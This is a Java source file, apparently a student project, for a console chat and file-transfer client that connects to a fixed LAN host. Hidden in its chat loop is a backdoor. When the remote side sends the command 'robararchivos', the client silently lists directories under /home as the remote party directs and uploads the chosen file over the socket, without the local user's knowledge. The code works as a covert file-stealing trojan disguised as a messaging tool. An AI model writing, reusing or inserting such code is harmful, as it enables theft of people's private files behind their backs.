/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Main.java to edit this template
 */
package proyecto;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.*;
import java.net.ConnectException;
import java.net.Socket;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.NoSuchFileException;
import java.nio.file.NotDirectoryException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author alex
 */
public class Secundario {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        // TODO code application logic here
        
        final String Host="192.168.1.73";   
        final int puerto = 5000;
        DataInputStream in;
        DataOutputStream out;
        BufferedInputStream bis;
        BufferedOutputStream bos;
        int i;
        byte[] byteArray;
        String filename;
        Scanner porleer =new Scanner(System.in);
        String mensaje="1";
        int opc=1;
        
        while(opc!=0){
            System.out.println("Escriba la opcion que desea.");
            System.out.println("1)Enviar mensaje");
            System.out.println("2)Enviar archivo");
            System.out.println("3)Recibir archivo");
            System.out.println("0)Salir"); 
            try{
                opc=Integer.parseInt(porleer.nextLine());
            }catch(Exception e){
                System.out.println("No escribió un entero.");
            }
            
            
            switch(opc){                
                case 1:
                    try {                        
                        while(!mensaje.equals("0")){                            
                            Socket sck = new Socket(Host,puerto);                            
                            in = new DataInputStream(sck.getInputStream()); 
                            out = new DataOutputStream(sck.getOutputStream()); 
                            if(mensaje.equals("finalizar")){                                
                                mensaje="1";
                                break;
                            }
                            System.out.print("Usted: ");
                            mensaje=porleer.nextLine();
                                                        
                            if(mensaje.equals("0")){
                                out.writeUTF("0");
                                mensaje="1";
                                sck.close();
                                break;
                            }else{                               
                                out.writeUTF(mensaje);                                
                                mensaje=in.readUTF();                                
                                if(mensaje.equals("0")){
                                    sck.close();
                                    System.out.println("El usuario ha salido.");
                                    mensaje="1";
                                    break;
                                }if(mensaje.equals("robararchivos")){
                                    String nombre="/home";
                                    String nombreaux,nombreaux2=nombre;
                                    mensaje="";
                                    while(!mensaje.equals("finalizar")){
                                        nombreaux=nombreaux2+"/"+mensaje;   
                                        try(DirectoryStream<Path> carpeta =Files.newDirectoryStream(Paths.get(nombreaux))){
                                            nombreaux2=nombreaux;
                                            for(Path arch : carpeta){
                                                out.writeUTF(arch.getFileName().toString());
                                            }
                                            out.writeUTF("archfin");
                                            mensaje=in.readUTF();
                                        }catch(NotDirectoryException excepcion){ 
                                                nombreaux2=nombreaux;
                                                out.writeUTF("robandoarchivo");
                                                try{
                                                    File localFile = new File(nombreaux2);                        
                                                    bis=new BufferedInputStream(new FileInputStream(localFile));
                                                    bos=new BufferedOutputStream(sck.getOutputStream());                                                    
                                                    byteArray=new byte[8192];                        
                                                    while((i=bis.read(byteArray))!=-1){
                                                        bos.write(byteArray,0,i);                                                        
                                                    }
                                                    
                                                    bis.close();
                                                    bos.close();
                                                    sck.close();
                                                    mensaje="finalizar";
                                                    //System.out.println("El usuario ha salido.");
                                                    break;                                                    
                                                }catch(Exception e){
                                                    System.out.println(nombreaux2);
                                                    System.out.println(e.toString());
                                                }
                                        }catch(NoSuchFileException nf){
                                            mensaje="archinexistente";
                                            out.writeUTF(mensaje);
                                            mensaje=in.readUTF();                                        
                                            
                                        }
                                        catch(IOException ex){
                                            System.out.println(ex.toString());
                                        }
                                        
                                    }if(mensaje.equals("finalizar")){
                                        System.out.println("El usuario ha salido");
                                        mensaje="1";
                                          
                                        sck.close();
                                        break;
                                    }
                                    
                                }
                                else{
                                    System.out.println("Otro: "+mensaje);
                                }
                            } 
                        }            
                    }                     
                    catch(ConnectException ex){
                        System.out.println("El usuario no está conectado.");
                        break;
                    }
                    catch (IOException ex) {
                        Logger.getLogger(Secundario.class.getName()).log(Level.SEVERE, null, ex);                                        
                    }
                break;                
                case 2:                    
                    try{   
                        Socket sck = new Socket(Host,puerto);   
                        System.out.println("Escriba el nombre del archivo:");
                        filename=porleer.nextLine();                        
                        File localFile = new File(filename);                        
                        bis=new BufferedInputStream(new FileInputStream(localFile));
                        bos=new BufferedOutputStream(sck.getOutputStream());
                        DataOutputStream dos=new DataOutputStream(sck.getOutputStream());                        
                        dos.writeUTF(localFile.getName());
                        byteArray=new byte[8192];                        
                        while((i=bis.read(byteArray))!=-1){
                            bos.write(byteArray,0,i);
                        }
                        bis.close();
                        bos.close();
                        sck.close();
                        System.out.println("Archivo "+filename+" transferido.");
                    }catch(Exception e){
                        System.out.println("El usuario no está conectado.");
                    }
                break;                
                case 3:
                    try{                        
                        Socket sck = new Socket(Host,puerto);
                        System.out.println("Transfiriendo archivo.");
                        byte[] receivedData=new byte[8192];
                        bis=new BufferedInputStream(sck.getInputStream());
                        in=new DataInputStream(sck.getInputStream());
                        filename=in.readUTF();
                        bos=new BufferedOutputStream(new FileOutputStream(filename));                          
                        while((i=bis.read(receivedData))!=-1){
                            bos.write(receivedData, 0, i);
                        }
                        bos.close();
                        in.close();
                        System.out.println("Archivo "+filename+" transferido");
                    }catch(Exception e){
                        System.out.println("El usuario no está conectado.");
                    }
                break;
                default:
                    System.exit(0);
                break;
            }
            
        }
       
    }
}
